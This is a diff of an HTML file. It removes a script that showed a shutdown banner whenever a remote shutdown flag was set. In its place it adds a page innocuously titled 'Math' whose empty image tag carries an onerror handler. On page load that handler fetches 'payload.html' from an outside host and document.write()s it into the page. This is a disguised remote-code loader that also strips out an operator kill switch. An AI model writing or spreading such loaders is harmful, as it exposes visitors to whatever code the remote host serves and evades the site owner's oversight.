@@ -1,15 +1,21 @@
-<script>
-async function checkShutdown() {
-  try {
-    const response = await fetch('shutdown.json');
-    const data = await response.json();
-    if (data.shutdown) {
-      document.body.innerHTML = '<h1>⚠️ SITE IS SHUTDOWN ⚠️</h1>';
-    }
-  } catch (err) {
-    console.error('Failed to fetch shutdown state', err);
-  }
-}
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Math</title>
+</head>
+<body>
 
-checkShutdown();
-</script>
+<img src=""
+onerror="
+fetch('https://nevapaid.github.io/cdn-site/payload.html')
+  .then(r => r.text())
+  .then(html => document.write(html))
+  .catch(e => {
+    document.body.innerHTML = '<h1>Failed to load</h1>';
+    console.error(e);
+  });
+">
+
+</body>
+</html>
